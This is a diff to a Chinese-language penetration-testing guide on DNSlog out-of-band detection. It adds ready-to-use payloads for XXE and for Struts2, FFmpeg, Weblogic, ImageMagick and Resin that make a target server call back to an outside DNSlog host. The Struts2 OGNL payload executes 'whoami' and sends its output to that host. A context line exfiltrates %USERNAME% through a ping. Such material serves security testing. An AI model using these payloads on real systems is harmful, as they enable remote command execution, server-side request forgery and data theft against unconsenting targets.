@@ -13,6 +13,13 @@
     - [命令执行](#命令执行)
     - [SSRF](#ssrf)
     - [XSS](#xss)
+    - [其他](#其他)
+        - [XML Entity Injection](#xml-entity-injection)
+        - [Struts2](#struts2)
+        - [FFMpeg](#ffmpeg)
+        - [Weblogic](#weblogic)
+        - [ImageMagick](#imagemagick)
+        - [Resin](#resin)
 - [DNSlog平台的搭建](#dnslog平台的搭建)
 - [参考](#参考)
 
@@ -138,6 +145,49 @@ ping %USERNAME%.b182oj.ceye.io
 ### SSRF
 
 ### XSS
+
+### 其他
+#### XML Entity Injection
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "http://ip.port.b182oj.ceye.io/xxe_test">
+%remote;]>
+<root/>
+```
+
+#### Struts2
+```
+xx.action?redirect:http://ip.port.b182oj.ceye.io/%25{3*4}
+xx.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'whoami'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://ip.port.b182oj.ceye.io/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}
+```
+
+#### FFMpeg
+```
+#EXTM3U
+#EXT-X-MEDIA-SEQUENCE:0
+#EXTINF:10.0,
+concat:http://ip.port.b182oj.ceye.io
+#EXT-X-ENDLIST
+```
+
+#### Weblogic
+```
+xxoo.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http://ip.port.b182oj.ceye.io/test&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Businesslocation&btnSubmit=Search
+```
+
+#### ImageMagick
+```
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(http://ip.port.b182oj.ceye.io)'
+pop graphic-context
+```
+
+#### Resin
+```
+xxoo.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://ip.port.b182oj.ceye.io/ssrf
+```
 
 ## DNSlog平台的搭建
 &emsp;在我们实际的渗透中，我们不想使用一些别人家搭建的DNSlog平台，比较还是有可能被记录在别人的服务器上面的，这就涉及到保密的问题，那么就需要有自己可控的DNSlog平台。
